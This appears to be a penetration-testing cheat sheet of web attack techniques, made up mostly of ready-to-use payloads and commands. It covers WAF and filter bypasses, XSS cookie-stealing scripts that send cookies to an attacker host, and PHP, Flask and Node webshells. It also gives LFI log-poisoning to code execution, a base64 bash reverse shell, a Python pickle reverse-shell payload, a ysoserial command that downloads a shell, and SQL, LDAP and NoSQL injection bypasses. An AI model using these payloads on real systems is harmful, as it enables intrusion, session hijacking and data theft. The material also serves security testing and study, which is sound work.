# Tricks - Web Penetration Tester
[x] In construction...
## What WAF does the application have?
<img class="center" height="450em" src="https://user-images.githubusercontent.com/54555784/188950014-db9eae26-8801-4f68-a673-01f0d7af5c15.png" />

### Tools - WAF Detection
-> wafw00f  
https://github.com/EnableSecurity/wafw00ff

-> nmap <ip> --script=http-waf-fingerprint  
https://nmap.org/nsedoc/scripts/http-waf-fingerprint.html

-> imperva-detect  
https://raw.githubusercontent.com/vmfae-iscteiulpt/imperva-detect/master/imperva-detect.sh

### Finding the direct IP address of a server
-> IP History  
https://www.iphistory.ch/en/  

-> DNS History  
```
bash bypass-firewalls-by-DNS-history.sh -d site.com
```
https://github.com/vincentcox/bypass-firewalls-by-DNS-history

-> Bypass to find real IP in CloudFlare - CrimeFlare  
```
./crimeflare.php exemple.com
```
https://github.com/zidansec/CloudPeler  
-> CloudFlair is a tool to find origin servers of websites protected by CloudFlare who are publicly exposed and don't restrict network access to the CloudFlare IP ranges as they should.  
```
python cloudflair.py myvulnerable.site
```

https://github.com/christophetd/CloudFlair  
-> Discover CloudFlare WordPress IP  
https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/

### Bypass using cipher not supported by WAF
```
python abuse-ssl-bypass-waf.py -thread 4 -target <target>  
curl --ciphers <cipher> -G <target> -d <payload>
```
https://github.com/LandGrey/abuse-ssl-bypass-waf  

-> Other Doc    
https://github.com/0xInfection/Awesome-WAF

## Host Obfuscation

<img height="400em" src="https://user-images.githubusercontent.com/54555784/188947375-6cb16b30-369c-4831-b783-47565623827b.png" />

e.g. (127.0.0.1)  
-> Octal  
0177.0000.0000.0001  
-> Hex  
0x7F000001  
-> Integer  
2130706433  
-> Hybrid  
0177.0.0x00.0001  

-> Online tool    
https://www.silisoftware.com/tools/ipconverter.php

## PHP Obfuscation Techniques:
### Mix - Hex + Octal
```
echo "T\x72\x69\143\153s";#Tricks
```

### Variable Parsing
```
$a = "ri"; $b ="ck"; echo "T$a[0]$a[1]$b[0]$b[1]s";#Tricks
```

### Variable Variables
```
$a = "T"; $$a = "ri"; $$$a = "cks"; echo $a.$T.$ri;#Tricks
```

### PHP Non-Alphanumeric 
```
$\_="{"; #XOR char
```  
```
echo $\_=($\_^"<").($\_^">").($\_^"/"); #XOR = GET
```  
https://web.archive.org/web/20160516145602/http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/

## PHP Bypass - disable_functions
### Functions

-> shell_exec  
```
<?php echo shell_exec($_GET['ok']);?>
```

-> system  
```
<?php system($_GET['ok']);?>  
```

-> exec  
```
<?php echo exec($_GET['ok']);?>  
```

-> scandir  
```
<?php foreach(scandir($_GET['ok']) as $dir){echo "<br>";echo $dir;};?>
```

-> file_get_contents  
```
<?php file_get_contents($_GET['ok']);?>
```

### PHP Obfuscation - base64+gzdeflate

https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/obfuscation/obfuscation.php

## Online PHP Executor
"3v4l.org (leetspeak for eval) is an online shell that allows you to run your code on my server. I compiled more than 250 different PHP versions (every version released since 4.3.0) for you to run online."  
https://3v4l.org/  

### PHP Obfuscation Decoders 
https://malwaredecoder.com/  
https://hackvertor.co.uk/public  

## Spoofing Internal IP in Request Header

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
Forwarded-For: 127.0.0.1
Forwarded-For-Ip: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/headers_internal_bypass.txt

## 403 Bypass 
```
./dontgo403 -u http://site.com/admin
```
https://github.com/devploit/dontgo403

## Cross-Site Scripting (Reflected, Stored, DOM, Mutation, Poliglote)
### XSS Protection
-> XSS Auditor and XSS Filter  
https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md  
https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html  
https://www.chromium.org/developers/design-documents/xss-auditor/  
https://portswigger.net/daily-swig/xss-protection-disappears-from-microsoft-edge  
https://developer.mozilla.org/pt-BR/docs/Web/HTTP/Headers/X-XSS-Protection

-> Wordlists for XSS Bypass  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/xss_bypass.txt  
https://gist.githubusercontent.com/rvrsh3ll/09a8b933291f9f98e8ec/raw/535cd1a9cefb221dd9de6965e87ca8a9eb5dc320/xxsfilterbypass.lst  
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Bypass-Strings-BruteLogic.txt  
https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt  
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/XSS/XSS-Cheat-Sheet-PortSwigger.txt

### XSS Keylogger
https://rapid7.com/blog/post/2012/02/21/metasploit-javascript-keylogger/  
https://github.com/hadynz/xss-keylogger

### XSS Mutation
http://www.businessinfo.co.uk/labs/mxss/

### XSS Poliglote
https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot

### Regex Blacklist Filtering
-> Filter blocking on - Bypass  
`(on\w+\s*=)`  
```
<svg onload%09=alert(1)> 
<svg %09onload%20=alert(1)>
<svg onload%09%20%28%2C%3B=alert(1)>
<svg onload%0B=alert(1)>
```  

### Keyword Based in Filter
#### Alert Blocked - Bypass
```
<script>\u0061lert(1)</script>
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>eval("\u0061lert(1)")</script>  
<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
```

#### Removing script Tag - Bypass
```
<sCR<script>iPt>alert(1)</SCr</script>IPt>
```

### Scaping Quote
#### Methods
-> String.fromCharCode()  
-> unescape  

e.g.  
-> decode URI + unescape method (need eval)  
```
decodeURI(/alert(%22xss%22)/.source)
decodeURIComponent(/alert(%22xss%22)/.source)
```  
 
### Other bypass techniques
-> unicode  
```
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)"/>
```

Add execution sink:  
-> eval  
-> setInterval  
-> setTimeout  

-> octal  
```
<img src=x onerror="eval('\141lert(1)')"/>
```
-> hexadecimal  
```
<img src=x onerror="setInterval('\x61lert(1)')"/>
```
-> mix  (uni, hex, octa)  
```
<img src=x onerror="setTimeout('\x61\154\145\x72\164\x28\x31\x29')"/>
```
https://checkserp.com/encode/unicode/  
http://www.unit-conversion.info/texttools/octal/  
http://www.unit-conversion.info/texttools/hexadecimal/  

### Other Examples
#### HTML Tag
```
<div>here</div>
```
->  
```
<svg/onload=alert(1)
```

#### HTML Tag Attributes
```
<input value="here"/></input>
```
 
->  
```
" /><script>alert(1)</script>
```
  
#### Script Tag
```
<script>
    var name="here";
</script>
```
  
->  
```
";alert(1);//
```

#### Event Attributes
```
<button onclick="here;">Okay!</button>
```

->  
```
alert(1)
```

#### Dom Based
```
<script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href=\'"+ok+"\'>ok</a>";</script>
```
  
->  
```
javascript:alert(1)
```

### JavaScript Encoding
-> jjencode  
https://utf-8.jp/public/jjencode.html   
-> aaencode  
https://utf-8.jp/public/aaencode.html  
-> jsfuck  
http://www.jsfuck.com/  
-> Xchars.js  
https://syllab.fr/projets/experiments/xcharsjs/5chars.pipeline.html  

### Decoder - Obfuscation (Javascript Decoder and PHP)
https://malwaredecoder.com/  

### XSS - Session Hijacking
-> Examples
```
<script type="text/javascript">document.location="http://ip/?cookie="+document.cookie;</script>  
<script>window.location="http://ip/?cookie="+document.cookie;</script>
<script>document.location="http://ip/?cookie="+document.cookie;</script>  
<script>fetch('http://ip/?cookie=' + btoa(document.cookie));</script>
```

### Tools
-> dalfox  
```
dalfox url http://example.com
```
https://github.com/hahwul/dalfox

-> gxss  
```
echo "https://target.com/some.php?first=hello&last=world" | Gxss -c 100
```
https://github.com/KathanP19/Gxss

### Template - Nuclei
https://raw.githubusercontent.com/esetal/nuclei-bb-templates/master/xss-fuzz.yaml

## Git Exposed
```
git-dumper http://site.com/.git .
```
https://github.com/arthaud/git-dumper

### Tools
https://github.com/internetwache/GitTools

## Broken Access Control - IDOR (Insecure Direct Object References)
1. Search listing of Id's in requests and in case you don't find create at least two accounts and analysis requests involving ID's  
2. Identify access controls in the application  
3. Change the request method (GET, POST, PUT, DELETE, PATCH…)  
4. search old versions of API's /api/v1/ /api/v2/ /api/v3/  
5. Try sending a (*) instead of the ID, especially at search points  
6. Brute-force IDs depending on context and predictability 
	
### IDOR + Parameter Pollution
#### HTTP Parameter Pollution
```
GET /api/v1/messages?id=<Another_User_ID> # unauthourized
GET /api/v1/messages?id=<You_User_ID>&id=<Another_User_ID> # authorized
GET /api/v1/messages?id[]=<Your_User_ID>&id[]=<Another_User_ID>
```
	
#### Json Parameter Pollution
```
POST /api/v1/messages
{"user_id":<You_user_id>,"user_id":<Anoher_User_id>} 
```
-> with a JSON Object
```
POST /api/v1/messages
{"user_id":{"user_id":<Anoher_User_id>}} 
```
-> with array  
```
{"user_id":001} #Unauthorized
{"user_id":[001]} #Authorized
```
#### Random Case
GET /admin/profile #Unauthorized
GET /ADMIN/profile #Authorized

### UUIDv1
https://caon.io/docs/exploitation/other/uuid/
https://github.com/felipecaon/uuidv1gen

#### Others
-> add .json if in ruby
```
/user/1029 # Unauthorized
/user/1029.json # Authorized
```
	
## Type Juggling and Hash Collision
https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf  
https://github.com/JohnHammond/ctf-katana#php

## Insecure Deserialization 
-> Binary (Java, C++, etc ...)  
-> Human-Readable (XML, JSON, SOAP, YAML, PHP)

### PHP Deserialization
#### PHP - Method Serialization:
-> serialize()  
-> unserialize()  

#### Magic Methods:
-> __construct()  
-> __destruct()  
-> __wakeup()  

#### Class Properties

Examples:
Public \<s>  
`O:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}`
  
Protected \0 * \0  
`O:4:"Okay":1:{s:11:"' . "\0" . '*' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}`

Private \0 \<s> \0    
`O:4:"Okay":1:{s:14:"' . "\0" . 'Okay' . "\0" . 'filepath";s:11:"/tmp/ok.txt";}`
  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/php/example.php
  
#### Trick Bypass

`a:2:{s:8:"anything";o:4:"Okay":1:{s:8:"filepath";s:11:"/tmp/ok.txt";}}`

### Tool

https://github.com/ambionics/phpggc
  
### Other

https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/php/token_hmac_sha1.php

### .NET Deserialization
#### Methods Serialization

-> Binary Formatter  
-> DataContractSerializer  
-> NetDataContractSerializer  
-> XML Serialization  
  
#### Most common places to find serialized data
-> VIEWSTATE  
-> .NET remoting services  

#### Identify
-> Detect via Response Simple in SOAP Message
```
POST /endpoint HTTP/1.1
Host: <ip>:<port>

<SOAP:Envelope>
</SOAP:Envelope>
```

```
ysoserial.exe -f SoapFormatter -g TextFormattingRunProperties -c "cmd /c ping <ip>" -o raw  
```
https://github.com/pwntester/ysoserial.net  
```
POST /endpoint HTTP/1.1
Host: ip:port
SOAPAction: something
Contet-Type: text/xml

<payload_ysoserial_here_without_<SOAP-ENV:Body>
```
`tcpdump -i tap0 icmp`

#### Exploitation
-> Insecure - Machine Key for RCE  
https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/deserialization/exploiting-__viewstate-parameter.md  

#### Tools
https://github.com/0xacb/viewgen  
https://github.com/pwntester/ysoserial.net  
https://github.com/NotSoSecure/Blacklist3r/tree/master/MachineKey/AspDotNetWrapper
https://github.com/tyranid/ExploitRemotingService

### Other Docs
https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net#PoC  

### Java Deserialization
#### Identify
-> import java.io.serializable  
-> binary with ac ed 00 05  
-> base64 starts with rO0AB in web applications
  
#### Java Lang Runtime Exec - java.lang.Runtime.exec()
  
bash -c {echo,payload_base64}|{base64,-d}|{bash,-i}  
https://www.bugku.net/runtime-exec-payloads/

`python hackshell.py --payload bash --lhost 192.168.0.20 --lport 443 --type jlre`  
```
bash -c {echo,YmEkKClzaCAtJCgpaSAnL2Rldi90Y3AvMTkyLjE2OC4wLjIwLzQ0MyAwPiYxJw==}|{base64,-d}|{bash,-i}
```
https://github.com/rodolfomarianocy/hackshell
#### Tools
https://github.com/frohoff/ysoserial  
https://github.com/NickstaDB/SerializationDumper  
https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java
  
#### Script

```
while read payload; 
do echo "$payload\n\n"; 
java -jar ysoserial.jar $payload "sleep 5" | base64 | tr -d '\n' > $payload.ser;  
echo "-----------------Loading-----------------\n\n"; done < payloads.txt
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/java/gserial.sh  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/java/payloads.txt

#### Signals
-> Bad Sign  
ClassNot FoundException

-> Good Sign  
java.io.IOException
  
#### JRMPListener and JRMPClient (CommonsCollections)
```
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 80 CommonsCollections "curl http://ip:port/shell.php -o /var/www/shell.php"
java -jar ysoserial-all.jar “JRMPClient” ip:80” |base64 -w0
```

### Python Deserialization

#### Pickle
```
import pickle
import os
from base64 import b64decode,b64encode

class malicious(object):
    def __reduce__(self):
        return (os.system, ("/bin/bash -c \"/bin/sh -i >& /dev/tcp/ip/port 0>&1\"",))

ok = malicious()
ok_serialized = pickle.dumps(ok)
print(b64encode(ok_serialized))
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/python/py_pickle.py

### YAML Deserialization
  
```
!!python/object/apply:os.system ["sleep 5"]
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/deserialization/yaml/exploit.yaml

### nodejs Deserialization

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

## XPATH Injection
```
error()
* and doc('http://hacker.site/')
* and doc('http://hacker.site/', name(/*) ))
```
  
### Tool
https://xcat.readthedocs.io/en/latest/
  
### Wordlists for SQLI e XPath - Authentication Bypass
https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt  
https://pastebin.com/raw/rKpsMp0g  

## LDAP Exploitation
### LDAP Injection - Bypass Login

```$filter = "(&(uid=$username)(userPassword=$password))";```  

```
https://site.com/admin.php?username=*&password=*
```  
or  
```
https://site.com/admin.php?username=admin)(userPassword=*))%00&password=blabla
```  

-> Other

```
https://site.com/item?objectClass=*
```  
```
(&(sn=administrator)(password=*))
```  
```
*))%00
```  

### LDAP Query
```
nmap -p 389,636 --script ldap-* <ip>
```  
or  
```
ldapsearch -x -H ldap://ip -D "cn=<cn>,dc=<dc>,dc=<dc>" -w <password>  -s base namingcontexts  
ldapsearch -x -H ldap://ip -D "cn=<cn>,dc=<dc>,dc=<dc>" -w <password>  -b "dc=<dc>,dc=<dc>
```
https://github.com/dinigalab/ldapsearch

### Docs
https://tldp.org/HOWTO/archived/LDAP-Implementation-HOWTO/schemas.html  
https://book.hacktricks.xyz/pentesting-web/ldap-injection
  
## Hash Length Extension Attack

-> Identify  
https://site.com/index.php?file=oktest&hash=hash

-> Exploitation  
1-  
```
./hash_extender -f sha1 --data 'oktest' -s hash --append '../../../../../../../../../etc/passwd' --secret-min=10 --secret-max=40 --out-data-format=html --table > payloads.out
```
https://github.com/iagox86/hash_extender  

2-  
burp intruder -> payloads.out in file parameter.  

## Local File Inclusion - LFI
### Replace ../ - Bypass
$language = str_replace('../', '', $_GET['file']);  
```
/....//....//....//....//etc/passwd  
..././..././..././..././etc/paswd  
....\/....\/....\/....\/etc/passwd 
```

### Block . and / - Bypass

-> urlencode and Double urlencode /etc/passwd  
```
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
```
```
%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34
```  
### PHP Wrappers

```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id  
expect://id  
php://filter/read=convert.base64-encode/resource=index.php  
php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

### Filter PHP
-> Predefined Paths  
preg_match('/^\.\/okay\/.+$/', $_GET['file'])  

```
./okay/../../../../etc/passwd
```  

### PHP Extension Bypass with Null Bytes
```
https://site.com/index.php?file=/etc/passwd%00.php
```  
-> Removing .php  
```
https://site.com/index.php?file=index.p.phphp
```  
  
#### LFI + File Upload
-> gif  
```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > ok.gif
``` 
https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/codes/webshells/shell.gif  
-> Zip  
1-  
```
echo '<?php system($_GET["cmd"]); ?>' > ok.php && zip wshell_zip.jpg ok.php
```
2-  
```
http://ip/index.php?file=zip://./uploads/wshell_zip.jpg%23ok.php&cmd=id  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/wshell_zip.jpg 
```

#### Log Poisoning
-> apache
```
nc ip 80  
<?php system($_GET[‘cmd’]); ?>  
```  
or  
1-  
```
curl -s http://ip/index.php -A '<?php system($_GET[‘cmd’]); ?>'
```
2-  
http://ip/index.php?file=/var/log/apache2/access.log&cmd=id  
  
-> SMTP  
```
telnet ip 23
MAIL FROM: email@gmail.com
RCPT TO: <?php system($_GET[‘cmd’]); ?>  
http://ip/index.php?file=/var/mail/mail.log&cmd=id
```  
  
-> SSH  
```
ssh \'<?php system($_GET['cmd']);?>'@ip  
http://ip/index.php?file=/var/log/auth.log&cmd=id
```  

-> PHP session  
```
http://ip/index.php?file=<?php system($_GET["cmd"]);?>  
http://ip/index.php?file=/var/lib/php/sessions/sess_<your_session>&cmd=id
```
  
-> Other Paths  
```
/var/log/nginx/access.log  
/var/log/sshd.log  
/var/log/vsftpd.log  
/proc/self/fd/0-50  
```

### Template LFI and directory traversal - Nuclei
https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/fuzzing/linux-lfi-fuzzing.yaml
https://raw.githubusercontent.com/CharanRayudu/Custom-Nuclei-Templates/main/dir-traversal.yaml

### Wordlists
-> burp-parameter-names.txt - Wordlist for parameter fuzzing  
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt  
	
-> Wordlist LFI - Linux  
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt  
	
-> Wordlist LFI - Windows  
https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt 
	
-> bypass_lfi.txt  
https://github.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/blob/main/wordlists/lfi_bypass.txt  
	
-> poisoning.txt  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/posoning.txt  

### Tool
```
python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a
```
https://github.com/hansmach1ne/lfimap  

## Path Normalization
https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf

## SQL Injection
### WAF and Filter Bypass
#### Query default:
```
'UNION SELECT 1,name,3,4 from users; -- -
```

#### Add comment /* */ for space bypass
```
'UNION/**/SELECT/**/1,name,3,4/**/from/**/users; -- -
```

#### Add comment /*! */ in query for filters bypass
```
'/*!UNION SELECT*/ 1,group_concat(name),3,4 from users; -- -
```

#### Add random case
```
`'UnIoN SeLeCt 1,GrOuP_cOnCaT(nAme),3,4 FrOm users; -- -
```

#### Example of mix:
```
'/*!UnIoN/**/SeLeCt/**/1,GroUp_ConCat(nAmE),3,4/**/FrOm/**/users; -- -
```

#### Other Techniques:
-> urlencode;  
-> Scientifc Notation;  
-> hexadecimal, substr, etc...  
  
### Webshell via SQLI
```
LOAD_FILE('/etc/httpd/conf/httpd.conf')    
select "<?php system($_GET['cmd']);?>" into outfile "/var/www/html/shell.php";
```
 
### Reading Files via SQLI - MySQL
e.g  
```
SELECT LOAD_FILE('/etc/passwd')
```

### RCE via SQLI - MSSQL
e.g  
```
EXEC xp_cmdshell 'powershell -c iwr http://site.com/$(whoami)';--
```

### Scripts Example
-> Second-Order SQL Injection (query connector)  - Example (edit)
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/second-order/script.php
	
-> Time Based SQL Injection Script - Example (edit)  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/time-based/sqli.py

### Out-Of-Band SQL Injection
```
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
  
### SQLMAP Tamper's
-> randomcase.py  
https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/tamper/randomcase.py  
-> ord2ascii.py  
https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/tamper/ord2ascii.py  
-> xforwardedfor.py  
https://raw.githubusercontent.com/sqlmapproject/sqlmap/master/tamper/xforwardedfor.py  
-> second-order.py - Example (edit)  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/sqli/tampers/second-order.py  

### CSRF Token Bypass - SQLMAP
```
sqlmap --csrf-url=http://site.com/user-profile --csrf-token="<token>" -r request.txt -p'<parameters>' --random-agent -D <database> -T <table> --dump
```

### XPATH Notation
e.g.  
```
%' and extractvalue(0x0a,concat(0x0a,(select database() limit 1))) -- -
``` 

### Wordlist for SQL Injection - Bypass  
https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/e126452093b9cde7f82eff14a15f8ceca8188701/sqli-bypass-waf.txt

### Doc for SQL Injection - Bypass  
https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_Bypassing_WAF.md

### Templates - Nuclei
https://raw.githubusercontent.com/geeknik/the-nuclei-templates/main/error-based-sql-injection.yaml
https://raw.githubusercontent.com/panch0r3d/nuclei-templates/master/header_sqli.yaml
https://raw.githubusercontent.com/ghsec/ghsec-jaeles-signatures/master/time-sqli.yaml

## NOSQL Injection
-> Auth bypass  
```
username=test&password=test  
username=admin&password[$ne]=abc  
username=admin&password[$regex]=^.{6}$  
username=admin&password[$regex]=^a.....  
```

## Webshell via redis
```
redis-cli -h ip  
config set dir /var/www/html  
config set dbfilename ok.php  
set test "<?php system($_GET['okay'); ?>"  
save
```

## Webshell Infecting views.py - Python (Flask)
```
import os
from flask import Flask,request,os

app = Flask(__name__)
   
@app.route('/okay')
def cmd():
    return os.system(request.args.get('c'))

if __name__ == "__main__":
	app.run()
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.py
	
## Webshell infecting views.js -> nodejs
```
const express = require('express')
const app = express();

app.listen(3000, () => 
	console.log('...')
);
function Exec(command){ 
	const { execSync } = require("child_process");
	const stdout = execSync(command);
	return "Result: "+stdout
}
app.get('/okay/:command', (req, res) => 
res.send(Exec(req.params.command))
);
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/webshells/views.js

## CSRF
e.g.  
-> csrf.html  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf.html
  
-> csrf_json.html  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_json.html
  
-> csrf_json_xhr.html  
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_json_xhr.html

### Bypass Token CSRF - Example
-> csrf_token_bypass.html  
```<script type="text/javascript">

function addUser(token)
{

	var url="https://site.com/add_user.php";
	var params="name=Admin&surname=ok&email=ok@gmail.com&role=admin&submit=CSRFToken=" + token;

	var CSRF = new XMLHttpRequest();
	CSRF.open("POST", url, true);
	CSRF.withCredentials = 'true';
	CSRF.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

	CSRF.send(params);

}

//Token Extraction
var XHR = new XMLHttpRequest();
XHR.onreadystatechange = function(){

	if(XHR.readyState == 4){
		var htmlSource = XHR.responseText;
		
		//Extract the token
		var parser = new DOMParser().parseFromString(htmlSource, "text/html");
		var token = parser.getElementById('CSRFToken').value;

		addUser(token);
	}
}

XHR.open('GET', 'http://site.com/add_user.php', true);
XHR.send();
	
</script>
```
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/csrf/csrf_token_bypass.html
### Analyze the token and perform brute-force

1-  
`burp intruder -> sequencer -> Token Location Within Response -> Start live capture -> save tokens`

2-  
`cat tokens.txt | uniq -c | nl`  

## ClickJacking
```
<iframe src="https://example.com">
```
-> Scan your site now - check for headers  
https://securityheaders.com/

## Host Header Injection
```
headi -url http://site.com/admin.php
```
https://github.com/mlcsec/headi

## Request Smuggling
### CL.TE - Content-Length X Transfer-Encoding
CL.TE: The frontend uses the Content-Length header and the backend server uses the Transfer-Encoding header  
e.g.  
```
POST / HTTP/1.1
Host: site.com
Content-Length: 11
Transfer-Encoding: chunked
	
0

ATTACK
```
1. Front-End use Content-Length of 11;  
2. back-end divides into 2 blocks to process.  
First block: 0  
Second block: Attack that will be processed in another request  
	
### TE.CL - Transfer-Encoding X Content-Length
TE.CL: The frontend uses the Transfer-Encoding header and the backend server uses the Content-Length header  
e.g.  
```
POST / HTTP/1.1
Host: site.com
Content-Length: 3
Transfer-Encoding: chunked

6
ATTACK
0
```
1. Front-End use Transfer-Encoding of 6 bytes and processes the request in two blocks:  
First block: Attack  
second block 0  
And that request is forwarded to the backend server.  
2. Back-End use and process Content-Length header of 3 bytes, and the remainder starting with ATTACK are not processed and the backend server will handle it on the next request.  
	
### TE.TE - Transfer-Encoding X Transfer-Encoding
The frontend and backend support Transfer-Encoding, but it is possible to induce a non-processing on one of the servers through the obfuscating of the header.
e.g.  
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding:[tab]chunked
Transfer-Encoding: x
[space]Transfer-Encoding: chunked
Transfer-Encoding[space]: chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```
	
### Tool	
```
python3 smuggler.py -u <URL>
```
https://github.com/defparam/smuggler

-> Study  
https://portswigger.net/web-security/request-smuggling  

## Open Redirect
#### Open Redirect to XSS
e.g.  
```
javascript:alert(1)
```
	
### Nuclei Template
https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/master/vulnerabilities/generic/open-redirect.yaml
	
## Server-Side Template Injection - SSTI
### Identify
-> Jinja2 or Twig  
```
{{3*3}}
```

-> Smarty or Mako  
```
{3*3}
```

-> ERB(Ruby)  
```
<%= 7*7 %>
```

-> FreeMarker  
```
#{3*3}
```

-> Other  
    
```
${3*3}
${{3*3}}
3*3
```

### Java Expression Language
```
{{T(java.lang.Runtime).getRuntime().exec('id')}}
''.class.forName('java.lang.Runtime').getRuntime().exec('id')
```

### FreeMarker
-> Remote Code Execution  
```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
```

### Python - Secret Key
  
```
{{settings.SECRET_KEY}}
```
  
### Doc for SSTI	
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
  
## Server Side Request Forgery - SSRF
### Bypass in Filters
-> Host obfuscation (hex, octa, integer)  
e.g.  
```
http://0177.0.0.1  
http://0x7F.0.0.1 
http://2130706433
```   

-> Rare address  
e.g.  
```
http://0/  
http://127.1
http://127.1.1  
http://127.127.127.127  
http://127.2.2.2  
http://127.2.0.2
```  

-> URL encoding  
e.g.  
`http://%31%32%37%2e%30%2e%30%2e%31`

-> Enclosed alphanumerics  
```
http://⑯⑨。②⑤④。⑯⑨｡②⑤④
http://①②⑦。①
```
-> Bash variables  
e.g.  
`http://evil.$site.com`

-> Bypass of whitelist  
e.g.  
`http://site.com@127.0.0.1`

-> Domain redirection  
e.g.  
`http://localtest.me`

-> Using [::]  
e.g.  
`http://[::]`

#### Wordlist meta-data Bypass
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/ssrf_meta_bypass.txt  

### Wordlist localhost Bypass
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/wordlists/ssrf_local_bypass.txt

### Protocol Smuggling

-> HTTP-Based(Elastic, CouchDB, Mongodb, docker),etc.  
-> Text-Based(ftp(21), smtp(587), zabbix(10051), mysql(3306), redis(6379), memcached(11211), etc.  

-> gopher  
`gopher://127.0.0.1:port/_`

#### Scripts
-> edit memcached.py  
```
stats items  
stats cachedump <slab class> <number of items to dump>  
get <item>
``` 
https://raw.githubusercontent.com/rodolfomarianocy/Tricks-Web-Penetration-Tester/main/codes/ssrf_protocol_smuggling/memcached.py 

-> zabbix.py  
